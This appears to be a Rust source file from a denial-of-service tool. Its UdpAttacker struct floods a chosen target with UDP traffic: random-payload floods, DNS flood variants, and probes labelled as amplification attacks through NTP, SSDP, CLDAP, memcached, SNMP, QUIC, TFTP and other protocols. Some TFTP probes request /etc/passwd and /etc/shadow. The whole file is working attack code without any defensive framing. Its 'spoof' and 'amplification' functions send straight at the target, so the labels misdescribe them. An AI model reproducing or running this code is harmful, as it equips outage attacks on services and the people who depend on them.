use std::net::{UdpSocket, SocketAddr};
use std::sync::Arc;
use std::sync::atomic::Ordering;
use rand::Rng;
use rand::seq::SliceRandom;
use crate::attack::WorkerCtx;

pub struct UdpAttacker { ctx: WorkerCtx }

impl UdpAttacker {
    pub fn from_ctx(ctx: &WorkerCtx) -> Self { Self { ctx: ctx.clone() } }

    fn alive(&self) -> bool { self.ctx.alive() }
    fn ok(&self)            { self.ctx.ok(); }
    fn err(&self)           { self.ctx.err(); }

    fn bind() -> Option<UdpSocket> {
        let s = UdpSocket::bind("0.0.0.0:0").ok()?;
        let _ = s.set_nonblocking(true);
        Some(s)
    }

    fn rand_bytes(n: usize) -> Vec<u8> {
        (0..n).map(|_| rand::thread_rng().gen()).collect()
    }

    fn rand_string(n: usize) -> String {
        (0..n).map(|_| (b'a' + rand::thread_rng().gen_range(0..26u8)) as char).collect()
    }

    fn send(&self, sock: &UdpSocket, addr: &str, data: &[u8]) {
        match sock.send_to(data, addr) {
            Ok(n) => { self.ctx.add_bytes(n as u64); self.ok(); }
            Err(_) => { self.err(); }
        }
    }

    fn build_dns_query(domain: &str, qtype: u16) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut pkt = rng.gen::<u16>().to_be_bytes().to_vec();
        pkt.extend_from_slice(&[0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00]);
        for label in domain.split('.') {
            pkt.push(label.len() as u8);
            pkt.extend_from_slice(label.as_bytes());
        }
        pkt.push(0x00);
        pkt.extend_from_slice(&qtype.to_be_bytes());
        pkt.extend_from_slice(&[0x00,0x01]);
        pkt
    }

    fn build_rtp() -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut p = vec![0x80u8, 0x00];
        p.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
        p.extend_from_slice(&rng.gen::<u32>().to_be_bytes());
        p.extend_from_slice(&rng.gen::<u32>().to_be_bytes());
        p.extend((0..160).map(|_| rng.gen::<u8>()));
        p
    }

    
    pub async fn udp_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                let payload = Self::rand_bytes(1472);
                for _ in 0..1000 {
                    if !self.alive() { break; }
                    self.send(&sock, &addr, &payload);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn udp_variable_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        let sizes = [64usize, 128, 256, 512, 1024, 1472];
        while self.alive() {
            if let Some(sock) = Self::bind() {
                let sz = *sizes.choose(&mut rand::thread_rng()).unwrap_or(&1472);
                let payload = Self::rand_bytes(sz);
                for _ in 0..500 {
                    if !self.alive() { break; }
                    self.send(&sock, &addr, &payload);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn dns_flood(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..200 {
                    if !self.alive() { break; }
                    let domain = format!(
                        "{}.{}.{}.com",
                        Self::rand_string(rand::thread_rng().gen_range(4..12)),
                        Self::rand_string(rand::thread_rng().gen_range(3..8)),
                        Self::rand_string(3)
                    );
                    self.send(&sock, &addr, &Self::build_dns_query(&domain, 0x0001));
                }
            } else { self.err(); }
        }
    }

    
    pub async fn dns_any_flood(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..200 {
                    if !self.alive() { break; }
                    let domain = format!("{}.com", Self::rand_string(8));
                    self.send(&sock, &addr, &Self::build_dns_query(&domain, 0x00FF));
                }
            } else { self.err(); }
        }
    }

    
    pub async fn dns_amp_edns(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..200 {
                    if !self.alive() { break; }
                    let domain = format!("{}.com", Self::rand_string(8));
                    let mut pkt = Self::build_dns_query(&domain, 0x00FF);
                    pkt[7] = 0x01; 
                    
                    pkt.extend_from_slice(&[0x00,0x00,0x29,0xFF,0xFF,0x00,0x00,0x80,0x00,0x00,0x00]);
                    self.send(&sock, &addr, &pkt);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn dns_nxdomain_flood(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..200 {
                    if !self.alive() { break; }
                    let fake = format!("{}.{}.nonexistent.invalid",
                        Self::rand_string(12), Self::rand_string(8));
                    self.send(&sock, &addr, &Self::build_dns_query(&fake, 0x0001));
                }
            } else { self.err(); }
        }
    }

    
    pub async fn ntp_amplification(&self) {
        let addr = format!("{}:123", self.ctx.target);
        let req: &[u8] = &[0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00];
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..500 {
                    if !self.alive() { break; }
                    self.send(&sock, &addr, req);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn ssdp_amplification(&self) {
        let addr = format!("{}:1900", self.ctx.target);
        let reqs: &[&[u8]] = &[
            b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n",
            b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: upnp:rootdevice\r\n\r\n",
            b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n\r\n",
        ];
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..300 {
                    if !self.alive() { break; }
                    let r = reqs.choose(&mut rand::thread_rng()).unwrap_or(&reqs[0]);
                    self.send(&sock, &addr, r);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn cldap_amplification(&self) {
        let addr = format!("{}:389", self.ctx.target);
        let req: &[u8] = &[
            0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,
            0x00,0x02,0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,
            0x6a,0x65,0x63,0x74,0x43,0x6c,0x61,0x73,0x73,0x30,0x00,
        ];
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..300 { if !self.alive() { break; } self.send(&sock, &addr, req); }
            } else { self.err(); }
        }
    }

    
    pub async fn memcached_amplification(&self) {
        let addr = format!("{}:11211", self.ctx.target);
        let reqs: &[&[u8]] = &[
            b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n",
            b"\x00\x01\x00\x00\x00\x01\x00\x00stats items\r\n",
            b"\x00\x01\x00\x00\x00\x01\x00\x00stats slabs\r\n",
        ];
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..400 {
                    if !self.alive() { break; }
                    let r = reqs.choose(&mut rand::thread_rng()).unwrap_or(&reqs[0]);
                    self.send(&sock, &addr, r);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn snmp_amplification(&self) {
        let addr = format!("{}:161", self.ctx.target);
        let communities: &[&[u8]] = &[b"public", b"private", b"admin", b"community"];
        while self.alive() {
            if let Some(sock) = Self::bind() {
                let comm = communities.choose(&mut rand::thread_rng()).unwrap_or(&communities[0]);
                let mut req = vec![0x30u8, (0x1a + comm.len()) as u8, 0x02, 0x01, 0x01, 0x04, comm.len() as u8];
                req.extend_from_slice(comm);
                req.extend_from_slice(&[0xa5,0x13,0x02,0x04,0x71,0xb4,0x2b,0x2c,
                    0x02,0x01,0x00,0x02,0x01,0x7f,0x30,0x05,0x30,0x03,0x06,0x01,0x00]);
                for _ in 0..300 { if !self.alive() { break; } self.send(&sock, &addr, &req); }
            } else { self.err(); }
        }
    }

    
    pub async fn chargen_amplification(&self) {
        let addr = format!("{}:19", self.ctx.target);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                let r = Self::rand_bytes(1);
                for _ in 0..500 { if !self.alive() { break; } self.send(&sock, &addr, &r); }
            } else { self.err(); }
        }
    }

    
    pub async fn voip_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(5004));
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..300 {
                    if !self.alive() { break; }
                    self.send(&sock, &addr, &Self::build_rtp());
                }
            } else { self.err(); }
        }
    }

    
    pub async fn quic_amplification(&self) {
        let addr = format!("{}:443", self.ctx.target);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..200 {
                    if !self.alive() { break; }
                    let mut rng = rand::thread_rng();
                    let mut pkt = vec![0xC0u8, 0x00, 0x00, 0x00, 0x01, 16u8];
                    pkt.extend((0..16).map(|_| rng.gen::<u8>()));
                    pkt.push(0x00); pkt.push(0x00);
                    pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
                    pkt.extend((0..1200).map(|_| rng.gen::<u8>()));
                    self.send(&sock, &addr, &pkt);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn coap_amplification(&self) {
        let addr = format!("{}:5683", self.ctx.target);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..300 {
                    if !self.alive() { break; }
                    let mut req = vec![0x40u8, 0x01];
                    req.extend_from_slice(&rand::thread_rng().gen::<u16>().to_be_bytes());
                    req.extend_from_slice(&[0xBB]); req.extend_from_slice(b".well-known");
                    req.push(0x04); req.extend_from_slice(b"core");
                    self.send(&sock, &addr, &req);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn tftp_amplification(&self) {
        let addr = format!("{}:69", self.ctx.target);
        let files: &[&[u8]] = &[
            b"\x00\x01/etc/passwd\x00octet\x00",
            b"\x00\x01/etc/shadow\x00octet\x00",
            b"\x00\x01/boot/vmlinuz\x00octet\x00",
        ];
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..300 {
                    if !self.alive() { break; }
                    let f = files.choose(&mut rand::thread_rng()).unwrap_or(&files[0]);
                    self.send(&sock, &addr, f);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn wsd_amplification(&self) {
        let addr = format!("{}:3702", self.ctx.target);
        let req = br#"<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action><wsa:MessageID>urn:uuid:00000000-0000-0000-0000-000000000000</wsa:MessageID></soap:Header><soap:Body><wsd:Probe><wsd:Types>wsdp:Device</wsd:Types></wsd:Probe></soap:Body></soap:Envelope>"#;
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..200 { if !self.alive() { break; } self.send(&sock, &addr, req); }
            } else { self.err(); }
        }
    }

    
    pub async fn plex_amplification(&self) {
        let addr = format!("{}:32414", self.ctx.target);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..300 { if !self.alive() { break; } self.send(&sock, &addr, b"M-SEARCH * HTTP/1.0\r\n\r\n"); }
            } else { self.err(); }
        }
    }

    
    pub async fn steam_amplification(&self) {
        let addr = format!("{}:27015", self.ctx.target);
        let probes: &[&[u8]] = &[
            b"\xFF\xFF\xFF\xFFTSource Engine Query\x00",
            b"\xFF\xFF\xFF\xFF\x55\xFF\xFF\xFF\xFF",
        ];
        while self.alive() {
            if let Some(sock) = Self::bind() {
                for _ in 0..300 {
                    if !self.alive() { break; }
                    let p = probes.choose(&mut rand::thread_rng()).unwrap_or(&probes[0]);
                    self.send(&sock, &addr, p);
                }
            } else { self.err(); }
        }
    }

    
    pub async fn openvpn_amplification(&self) {
        let addr = format!("{}:1194", self.ctx.target);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                let mut req = vec![0x38u8];
                req.extend(Self::rand_bytes(31));
                for _ in 0..300 { if !self.alive() { break; } self.send(&sock, &addr, &req); }
            } else { self.err(); }
        }
    }

    
    pub async fn spoof_udp_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.alive() {
            if let Some(sock) = Self::bind() {
                let payload = Self::rand_bytes(1472);
                for _ in 0..500 { if !self.alive() { break; } self.send(&sock, &addr, &payload); }
            } else { self.err(); }
        }
    }
}
